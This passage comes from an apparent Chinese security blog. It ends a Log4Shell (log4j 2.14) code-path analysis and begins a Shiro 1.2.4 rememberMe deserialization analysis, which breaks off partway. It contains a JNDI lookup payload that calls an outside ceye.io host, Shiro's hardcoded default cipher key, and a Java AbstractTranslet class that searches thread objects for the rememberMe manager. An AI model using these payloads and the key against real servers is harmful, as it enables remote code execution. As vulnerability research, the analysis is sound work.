<p>判断可以记录之后调用<font color=red>logMessage</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790410030429.jpg"></p>
<p>中间的过程就不分析了，一直到<font color=red>format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790415878786.jpg"></p>
<p>首先我看先看一下这个format方法里面的<font color=red>offset</font><br>他其实就是获取我们log4j2.xml里面的日志输出前缀，然后把msg里面的messageFormat加到workingBuilder里面，下面的for循环是判断字符串里面是否存在${，如果存在那么去<font color=red>substring</font>获取这个范围的字符串，其实就是获取用户输入的字符串。</p>
<p><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790418651892.jpg"></p>
<p>这里获取到用户输入的value，然后调用<font color=red>replace</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790428038870.jpg"></p>
<p><font color=red>replace</font>又去调用<font color=red>substitute</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790429142937.jpg"></p>
<p>接着<font color=red>substitute</font>又去调用<font color=red>substitute</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790434101896.jpg"></p>
<p>调用substitute之后获取到了varName，调用<font color=red>resolveVariable</font>，<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790436727911.jpg"></p>
<p><font color=red>resolveVariable</font>再进行调用<font color=red>lookup</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790437478732.jpg"></p>
<p>lookup里面将prefix、name取出，然后调用lookup这个map，这个map为之前介绍的strLookupMap。<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790438639330.jpg"></p>
<p>因为我们写的调用为${java:version}，所以他会走到JavaLookup这个里面的lookup里面。<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790440268620.jpg"></p>
<p>之后运行结束得到结果：<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790440670210.jpg"></p>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><h4 id="支持递归"><a href="#支持递归" class="headerlink" title="支持递归"></a>支持递归</h4><p>substitute里面通过while循环去递归匹配查询${，所以我们可以写入如下payload：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String a=<span class="string">&quot;$&#123;jndi:ldap://$&#123;java:version&#125;.xxxxx.ceye.io&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="高版本jndi"><a href="#高版本jndi" class="headerlink" title="高版本jndi"></a>高版本jndi</h4><p>jndi的ldap默认支持8版本191版本之前的，要想突破高版本的现在，目前我了解了两种方法可以绕过高版本限制：</p>
<ul>
<li>通过反序列化去绕过</li>
<li>使用目标本地工厂类</li>
</ul>
<p>因为这两个点内容也很多，后面文章再补充这方面的知识。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>JAVASEC</tag>
        <tag>log4j2</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro 1.2.4反序列化命令执行漏洞分析</title>
    <url>/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="shiro-1-2-4反序列化命令执行漏洞分析"><a href="#shiro-1-2-4反序列化命令执行漏洞分析" class="headerlink" title="shiro 1.2.4反序列化命令执行漏洞分析"></a>shiro 1.2.4反序列化命令执行漏洞分析</h2><p>前几天本来想复现fastjson系列的漏洞，但是看了一段时间fastjson的源码变量名称都是x、y、z这种无规则无规范的命名方式，十分头晕，所以打算还是先分析一下shiro的漏洞原理吧。<br>下方所有实验代码在<a href="https://github.com/f19t/shiro_1.2.4env">https://github.com/f19t/shiro_1.2.4env</a></p>
<span id="more"></span>

<hr>
<p>环境准备：</p>
<ul>
<li>jdk 1.8.0_152</li>
<li>idea 2023.3.3</li>
<li>shiro-spring 1.2.4</li>
<li>Spring boot 2.6.11</li>
</ul>
<h3 id="反序列化漏洞位置"><a href="#反序列化漏洞位置" class="headerlink" title="反序列化漏洞位置"></a>反序列化漏洞位置</h3><p>反序列化的位置在org.apache.shiro.io.DefaultSerializer的<strong>deserialize()</strong> 方法<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787850934297.jpg"><br>我们在反序列化的位置下断点，我们使用写的登录界面成功登录之后，会获得一个rememberMe，然后我们带着rememberMe访问任何一个界面，注意shiro1.2.4我在写spring boot这个程序的时候会获取一个jsessionid，我们需要删掉这个jsessionid，只保留rememberMe的cookie进行访问。<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787852451876.jpg"></p>
<p>关键堆栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">deserialize:<span class="number">77</span>, DefaultSerializer (org.apache.shiro.io)</span><br><span class="line">deserialize:<span class="number">514</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">convertBytesToPrincipals:<span class="number">431</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedPrincipals:<span class="number">396</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:<span class="number">604</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:<span class="number">492</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787853127005.jpg"></p>
<p>我们跟进去看一下代码运行的逻辑。</p>
<p>首先resolvePrincipals中调用principals &#x3D; this.getRememberedIdentity(context);去处理rememberMe，</p>
<p><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787853510036.jpg"><br>然后getRememberedIdentity调用getRememberedPrincipals。<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787854424682.jpg"></p>
<p>之后getRememberedPrincipals又两个关键处理:第一处getRememberedSerializedIdentity进行base64解码。第二处就是将字节进行解密并反序列化。<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787855750011.jpg"></p>
<p>第一处解码base64<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787856808477.jpg"><br>第二处解密并反序列化。<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787857778962.jpg"><br>这里注意解密的方法在org.apache.shiro.mgt.AbstractRememberMeManager中，其中key默认为private static final byte[] DEFAULT_CIPHER_KEY_BYTES &#x3D; Base64.decode(“kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;”);<br>如果没有设置key。加解密key为默认值。</p>
<ul>
<li>private byte[] encryptionCipherKey;</li>
<li>private byte[] decryptionCipherKey;</li>
</ul>
<p>该类中存在setCipherKey方法，如果设置了setCipherKey那么最终的key为设置的。</p>
<p>这里我们并没有进行设置key所以使用默认的key进行加解密。</p>
<p>至此，我们就可以进行构造反序列化，执行命令，执行回显这里就不多介绍了。</p>
<h3 id="shiro-tips"><a href="#shiro-tips" class="headerlink" title="shiro tips"></a>shiro tips</h3><h4 id="修改key"><a href="#修改key" class="headerlink" title="修改key"></a>修改key</h4><p>我们知道获取key是在org.apache.shiro.mgt.AbstractRememberMeManager但是这个类是抽象类，具体实现类在org.apache.shiro.web.mgt.CookieRememberMeManager。</p>
<p>我们用之前写的搜索程序，来搜一下看一下线程里面是否包含CookieRememberMeManager。<br>这里我又学到一点，fields[i].get(obj).getClass().getName()获取到的可能是org.springframework.web.servlet.DispatcherServlet$$Lambda$572&#x2F;995785821这种匿名类或者是代理的类，我们通过Class.forName()是获取不到这种类的，所有我把之前写的location代码进行了一处修改，就是把Class clazz &#x3D; lcat.obj.getClass();直接从obj去获取class。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#location.java</span><br><span class="line"><span class="keyword">package</span> org.example.spring_shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/3/6 15:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">location</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">location</span><span class="params">(Object obj, String clazz, String path)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">        <span class="built_in">this</span>.path = path;</span><br><span class="line">        <span class="built_in">this</span>.clazz = clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object obj;</span><br><span class="line">    <span class="keyword">public</span> String path;</span><br><span class="line">    <span class="keyword">public</span> String clazz;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Queue&lt;location&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;location&gt;();<span class="comment">//队列保证广度优先搜索</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Set&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();<span class="comment">//set记录哪些对象被搜索过</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">search</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">location</span> <span class="variable">laco</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(Thread.currentThread(), <span class="string">&quot;org.apache.tomcat.util.threads.TaskThread&quot;</span>,<span class="string">&quot;TaskThread&quot;</span>);</span><br><span class="line">        queue.offer(laco);</span><br><span class="line">        set.add(Thread.currentThread());</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (queue.size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            basic_search1(queue.poll());</span><br><span class="line"><span class="comment">//            if (i==500)&#123;break;&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">basic_search1</span><span class="params">(location lcat)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> lcat.obj;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> lcat.path;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> lcat.obj.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            Class clazz = Class.forName(&quot;org.apache.tomcat.util.threads.TaskThread&quot;);</span></span><br><span class="line">            <span class="keyword">for</span> (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123;</span><br><span class="line"></span><br><span class="line">                Field fields[] = clazz.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">                    fields[i].setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">if</span> (fields[i].get(obj) == <span class="literal">null</span>)&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!isblack(fields[i].getType().getName()) &amp;&amp; fields[i].get(obj) != <span class="literal">null</span> &amp;&amp; set.add(fields[i].get(obj))) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (is_map(fields[i].getType().getSimpleName())) &#123;</span><br><span class="line">                            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) fields[i].get(obj);</span><br><span class="line">                            <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">map_num</span> <span class="operator">=</span> <span class="number">0</span>; map_num &lt; map.size(); map_num++) &#123;</span><br><span class="line">                                    <span class="type">Object</span> <span class="variable">map_obj</span> <span class="operator">=</span> map.get(map_num);</span><br><span class="line">                                    <span class="keyword">if</span> (map_obj != <span class="literal">null</span> &amp;&amp; set.add(map_obj) &amp;&amp; !isblack(map_obj.getClass().getName())) &#123;</span><br><span class="line">                                        <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(map_obj, map_obj.getClass().getName(), path + <span class="string">&quot;--&gt;&quot;</span> + fields[i].getName() + <span class="string">&quot;[&quot;</span> + map_num + <span class="string">&quot;]&quot;</span>+map_obj.getClass().getName());</span><br><span class="line"><span class="comment">//                                        System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;);</span></span><br><span class="line">                                        queue.offer(l);</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_list(fields[i].getType().getSimpleName())) &#123;</span><br><span class="line">                            <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (List) fields[i].get(obj);</span><br><span class="line">                            <span class="keyword">if</span> (list.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">list_num</span> <span class="operator">=</span> <span class="number">0</span>; list_num &lt; list.size(); list_num++) &#123;</span><br><span class="line">                                    <span class="type">Object</span> <span class="variable">list_obj</span> <span class="operator">=</span> list.get(list_num);</span><br><span class="line">                                    <span class="keyword">if</span> (list_obj != <span class="literal">null</span> &amp;&amp; set.add(list_obj) &amp;&amp; !isblack(list_obj.getClass().getName())) &#123;</span><br><span class="line">                                        <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(list_obj, list_obj.getClass().getName(), path + <span class="string">&quot;--&gt;&quot;</span> + fields[i].getName() + <span class="string">&quot;[&quot;</span> + list_num + <span class="string">&quot;]&quot;</span>+list_obj.getClass().getName());</span><br><span class="line"><span class="comment">//                                        System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + list_obj.getClass().getName()+&quot;[&quot; + list_num + &quot;]&quot;);</span></span><br><span class="line">                                        queue.offer(l);</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (fields[i].getType().isArray()) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//                            Object objarr1 = fields[i].get(obj);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                Object[] arrobj = (Object[])fields[i].get(obj);</span><br><span class="line">                                <span class="keyword">if</span> (arrobj.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">obj_num</span> <span class="operator">=</span> <span class="number">0</span>; obj_num &lt; arrobj.length; obj_num++) &#123;</span><br><span class="line">                                        <span class="type">Object</span> <span class="variable">arr_obj</span> <span class="operator">=</span> arrobj[obj_num];</span><br><span class="line">                                        <span class="keyword">if</span> (arr_obj != <span class="literal">null</span> &amp;&amp; set.add(arr_obj) &amp;&amp; !isblack(arr_obj.getClass().getName())) &#123;</span><br><span class="line">                                            <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(arr_obj, arr_obj.getClass().getName(), path + <span class="string">&quot;--&gt;&quot;</span> + fields[i].getName() + <span class="string">&quot;[&quot;</span> + obj_num + <span class="string">&quot;]&quot;</span>+arr_obj.getClass().getName());</span><br><span class="line"><span class="comment">//                                            System.out.println(path + &quot;--&gt;&quot; + fields[i].getClass().getName() + &quot;[&quot; + obj_num + &quot;]&quot;);</span></span><br><span class="line">                                            queue.offer(l);</span><br><span class="line">                                        &#125;</span><br><span class="line"></span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line"><span class="comment">//                                System.out.println(fields[i].get(obj));</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (is_target(fields[i],obj)) &#123;</span><br><span class="line">                            System.out.println(path+<span class="string">&quot;---&gt;&quot;</span>+fields[i].getName()+<span class="string">&quot;(&quot;</span>+fields[i].get(obj).getClass().getName()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line"><span class="comment">//                            RequestFacade reqfd = (RequestFacade) fields[i].get(obj);</span></span><br><span class="line"><span class="comment">//                            Field f = reqfd.getClass().getDeclaredField(&quot;request&quot;);</span></span><br><span class="line"><span class="comment">//                            f.setAccessible(true);//因为是protected</span></span><br><span class="line"><span class="comment">//                            Request req = (Request) f.get(reqfd);//反射获取值</span></span><br><span class="line"><span class="comment">//                            Field ff = req.getClass().getDeclaredField(&quot;response&quot;);</span></span><br><span class="line"><span class="comment">//                            ff.setAccessible(true);</span></span><br><span class="line"><span class="comment">//                            Response resp = (Response) ff.get(req);</span></span><br><span class="line"><span class="comment">//                            PrintWriter out = resp.getWriter();</span></span><br><span class="line"><span class="comment">//                            out.println(&quot;wwwwww&quot;);</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(fields[i].get(obj), fields[i].get(obj).getClass().getName(), path+<span class="string">&quot;---&gt;&quot;</span>+fields[i].getName()+<span class="string">&quot;(&quot;</span>+fields[i].get(obj).getClass().getName()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">                        queue.offer(l);</span><br><span class="line"><span class="comment">//                        System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;);</span></span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isblack</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">aBoolean</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        List&lt;String&gt; black = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(Arrays.asList(<span class="string">&quot;java.lang.Byte&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Short&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Integer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Long&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Float&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Boolean&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.String&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">                <span class="string">&quot;java.lang.Character&quot;</span>,</span><br><span class="line"></span><br><span class="line">                <span class="string">&quot;java.io.File&quot;</span>,</span><br><span class="line">                <span class="string">&quot;byte&quot;</span>,</span><br><span class="line">                <span class="string">&quot;short&quot;</span>,</span><br><span class="line">                <span class="string">&quot;int&quot;</span>,</span><br><span class="line">                <span class="string">&quot;long&quot;</span>,</span><br><span class="line">                <span class="string">&quot;double&quot;</span>,</span><br><span class="line">                <span class="string">&quot;float&quot;</span>,</span><br><span class="line">                <span class="string">&quot;boolean&quot;</span></span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; black.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s == black.get(i)) &#123;</span><br><span class="line">                aBoolean = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">return</span> aBoolean;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> aBoolean;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">is_target</span><span class="params">(Field f,Object o)</span> <span class="keyword">throws</span> IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line"><span class="comment">//                f.getName() == &quot;request&quot;</span></span><br><span class="line"><span class="comment">//                || f.get(o).getClass().getName() == &quot;org.apache.catalina.connector.RequestFacade&quot;</span></span><br><span class="line"><span class="comment">//                || f.get(o).getClass().getName() == &quot;org.apache.catalina.connector.Request&quot;</span></span><br><span class="line"><span class="comment">//                || f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.Request&quot;))</span></span><br><span class="line"><span class="comment">//                || f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.core.ApplicationHttpRequest&quot;))</span></span><br><span class="line"><span class="comment">//                f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;))</span></span><br><span class="line">                f.get(o).getClass().getName().contains(<span class="string">&quot;CookieRememberMeManager&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//                || f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;))</span></span><br><span class="line"><span class="comment">//                || f.get(o).getClass().getName() == &quot;org.apache.catalina.core.ApplicationHttpRequest&quot;</span></span><br><span class="line"><span class="comment">//                || f.get(o).getClass().getName() == &quot;org.apache.coyote.Request&quot;</span></span><br><span class="line"><span class="comment">//                || f.get(o).getClass().getSimpleName() == &quot;Request&quot;</span></span><br><span class="line"><span class="comment">//                || f.get(o).getClass().getSimpleName() == &quot;HttpServletRequest&quot;</span></span><br><span class="line"><span class="comment">//                || f.getName() == &quot;req&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//                || f.get(o).getClass().getName() == &quot;org.apache.coyote.RequestGroupInfo&quot;)</span></span><br><span class="line"><span class="comment">//                &amp;&amp; f.get(o).getClass().getName()!=&quot;java.lang.Object&quot;</span></span><br><span class="line"></span><br><span class="line">        )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">is_list</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;List&quot;</span>.equals(s) || <span class="string">&quot;ArrayList&quot;</span>.equals(s))&#123;</span><br><span class="line">            b = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">is_map</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Map&quot;</span>.equals(s) || <span class="string">&quot;HashMap&quot;</span>.equals(s))&#123;</span><br><span class="line">            b = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们之间在hello这个路径上添加location.search()<br><img src="/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16787911072427.jpg"></p>
<p>登录之后访问hello<br>我们可以获得线程里面的，这里我只获取到一条，网络上有人获取了两条，估计是版本的问题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TaskThread---&gt;inheritableThreadLocals(java.lang.ThreadLocal$ThreadLocalMap)--&gt;</span><br><span class="line">table[6]java.lang.ThreadLocal$ThreadLocalMap$Entry---&gt;</span><br><span class="line">value(java.util.HashMap)--&gt;</span><br><span class="line">table[6]java.util.HashMap$Node---&gt;</span><br><span class="line">value(org.apache.shiro.web.mgt.DefaultWebSecurityManager)---&gt;</span><br><span class="line">rememberMeManager(org.apache.shiro.web.mgt.CookieRememberMeManager)</span><br></pre></td></tr></table></figure>

<p>我们尝试修改线程里面的key看一下能否修改全局的key。</p>
<p>首先我们设置两条访问入口路线。</p>
